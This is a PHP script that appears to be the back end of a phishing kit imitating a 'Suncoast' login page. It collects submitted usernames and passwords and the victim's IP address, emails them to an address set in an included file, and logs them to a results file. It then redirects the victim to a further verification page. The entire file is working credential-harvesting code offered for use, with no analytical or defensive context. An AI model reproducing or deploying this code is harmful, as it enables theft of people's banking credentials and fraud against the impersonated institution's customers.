<?php
error_reporting(0);
$user = $_POST['username'];
if (empty($user)) {
	echo "<script>window.location.href='../index.php';</script>";
	die();
}
include '../email.php';
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Login Info--------------\n";
$message .= "Username: ".$_POST['username']."  \n";
$message .= "Password: ".$_POST['password']."  \n";
$message .= "IP: ".$ip."  \n";
$message .= "---------------legitspamtools.com-------------\n";
$subject = "Suncoast {Login Info} from $ip";
$headers = "From: Suncoast<admin@spamtools.io>";
$headers = "MIME-Version: 1.0\n";
mail($email,$subject,$message,$headers);
$save = fopen("../results/login.txt", "a");
fwrite($save, $message);
echo "<script>window.location.href='../emailverify.php';</script>";
exit;
?>
